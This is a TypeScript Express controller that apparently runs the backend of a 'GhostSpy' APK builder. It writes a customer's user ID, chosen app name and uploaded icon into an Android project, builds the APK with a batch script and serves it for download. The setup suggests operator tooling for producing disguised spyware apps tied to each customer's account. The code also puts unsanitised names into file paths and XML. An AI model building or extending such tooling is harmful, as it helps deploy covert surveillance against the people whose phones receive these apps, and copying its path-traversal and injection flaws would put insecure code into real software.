import { Request, Response } from "express";
import { validationResult } from "express-validator";
import fs from "fs";
import path from "path";
import sharp from "sharp";
import { spawn } from "child_process";
import App from "../models/app.model";
import User from "../models/user.model";

const BAT_PATH = process.env.BAT_PATH;

export const createNewApk = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	try {
		const { userId, appName } = req.body;
		const appIcon = req.file; // Get the uploaded file

		if (!userId) {
			return res.status(400).json({ error: "userId is required" });
		}

		// Step 1: Replace the userId and appName in the strings.xml file
		const filePath = path.join(
			__dirname,
			"../../public/GhostSpy/app/src/main/res/values/strings.xml"
		);
		const fileContent = await fs.promises.readFile(filePath, "utf8");

		let newContent = fileContent.replace(
			/<string name="app_user_id">.*<\/string>/,
			`<string name="app_user_id">${userId}</string>`
		);

		newContent = newContent.replace(
			/<string name="app_name">.*<\/string>/,
			`<string name="app_name">${appName}</string>`
		);

		await fs.promises.writeFile(filePath, newContent, "utf8");

		// Step 2: Save and Resize the Uploaded Icon
		if (appIcon) {
			const iconPath = path.join(
				__dirname,
				"../../public/uploads",
				appIcon.filename
			);

			const sizes = {
				"mipmap-hdpi": 72,
				"mipmap-mdpi": 48,
				"mipmap-xhdpi": 96,
				"mipmap-xxhdpi": 144,
				"mipmap-xxxhdpi": 192,
			};

			const resizeAndSaveIcon = async (size: number, folder: string) => {
				const outputPath = path.join(
					__dirname,
					`../../public/GhostSpy/app/src/main/res/${folder}/`
				);

				await fs.promises.mkdir(outputPath, { recursive: true });

				await sharp(iconPath)
					.resize(size, size)
					.toFile(path.join(outputPath, "ic_launcher.webp"));

				await sharp(iconPath)
					.resize(size, size)
					.toFile(
						path.join(outputPath, "ic_launcher_foreground.webp")
					);

				await sharp(iconPath)
					.resize(size, size)
					.toFile(path.join(outputPath, "ic_launcher_round.webp"));
			};

			await Promise.all(
				Object.entries(sizes).map(([folder, size]) =>
					resizeAndSaveIcon(size, folder)
				)
			);
		}

		// Step 3: Build new APK
		console.log(`Starting APK build process...`);

		// Use spawn to run the .bat file
		const batProcess = spawn("cmd.exe", ["/c", BAT_PATH as string], {
			detached: true,
			stdio: "ignore",
		});

		batProcess.unref();

		// Wait for the APK to be built
		batProcess.on("close", async (code) => {
			if (code !== 0) {
				console.error(`APK build process exited with code ${code}`);
				return res.status(500).json({ error: "Failed to build APK" });
			}

			try {
				// Step 4: Make the APK available for download
				const apkPath = path.join(
					__dirname,
					"../../public/GhostSpy/app/build/outputs/apk/debug/app-debug.apk"
				);

				const fileExists = await fs.promises
					.stat(apkPath)
					.catch(() => null);
				if (!fileExists || !fileExists.isFile()) {
					throw new Error("APK file was not created.");
				}

				// Move the APK to a publicly accessible directory
				const publicPath = path.join(
					__dirname,
					"../../public/downloads",
					`${appName}.apk` // Use appName for the file name
				);

				await fs.promises.copyFile(apkPath, publicPath);

				// Add new APK info to the App model
				await App.create({
					userId,
					name: appName,
					path: publicPath,
				});

				// Update User model's apk field
				await User.findOneAndUpdate(
					{ _id: userId },
					{ apk: "created", apkName: appName }
				);

				res.status(200).json({ success: true });
			} catch (error) {
				console.error(
					"Error making APK available for download:",
					error
				);
				res.status(500).json({
					error: "Failed to prepare APK for download",
				});
			}
		});
	} catch (error) {
		console.error("Error processing APK:", error);
		res.status(500).json({ error: "Failed to process the APK" });
	}
};

// Get New APK
export const getNewApk = async (req: Request, res: Response) => {
	// Check for validation errors
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	try {
		const { data } = req.params;

		// Construct the file path
		const filePath = path.join(
			__dirname,
			"../../public/downloads",
			`${data}.apk`
		);

		// Check if the file exists
		if (!fs.existsSync(filePath)) {
			return res.status(404).json({ error: "APK file not found" });
		}

		// Set headers and send the file
		res.setHeader(
			"Content-Type",
			"application/vnd.android.package-archive"
		);
		res.setHeader(
			"Content-Disposition",
			`attachment; filename="${data}.apk"`
		);
		fs.createReadStream(filePath).pipe(res);
	} catch (error) {
		console.error("Error processing APK:", error);
		res.status(500).json({ error: "Failed to process the APK" });
	}
};
